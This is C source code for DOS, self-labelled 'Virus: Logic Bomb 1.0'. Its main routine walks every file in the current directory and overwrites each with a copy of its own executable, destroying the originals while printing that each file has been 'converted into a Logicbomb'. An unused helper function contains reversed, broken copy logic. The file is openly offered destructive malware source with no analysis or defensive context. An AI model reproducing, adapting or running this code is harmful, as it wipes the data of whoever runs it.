#include<stdio.h>
#include<dos.h>
#include<dir.h>
#include<fcntl.h>
#include<conio.h>
#include<string.h>
void ext_rename(char file[])
 {
 char old[1000],ext[]="exe";
 int i,status;
 strcpy(file,old);
 for(i=0;i<strlen(file);i++)
  {
   if(file[i]=='.')
    {
     file[++i]='\0';
     break;
    }
   }
  strcat(file,ext);
  rename(old,file);
}
void main(int argc,char* argv[])
{
 char buf[512];
 char old[1000],ext[]="exe";
 int i,status;
 int source,target,byt,done;
 struct ffblk ffblk;
 clrscr();
 textcolor(BLUE);
 cprintf("--------------------------------------------------------------------------");
 printf("\nVirus: Logic Bomb 1.0\nProgrammer: dhaya N\n");
 cprintf("--------------------------------------------------------------------------");
 textcolor(GREEN);
 printf("\n");
 cprintf("\nPress any key to start Injecting..");
 getch();
 done = findfirst("*.*",&ffblk,0);
while(!done)
{
  printf("\n");
  textcolor(YELLOW);
  cprintf(" %s ", ffblk.ff_name);
  printf("is converted into a");
  textcolor(RED);
  cprintf(" Logicbomb");
  source=open(argv[0],O_RDONLY|O_BINARY);
  target=open(ffblk.ff_name,O_CREAT|O_BINARY|O_WRONLY);
  while(1)
   {
     byt=read(source,buf,512);
     if(byt>0)
     write(target,buf,byt);
      else
       break;
   }
  close(source);
  close(target);
  done = findnext(&ffblk);
 }

getch();
}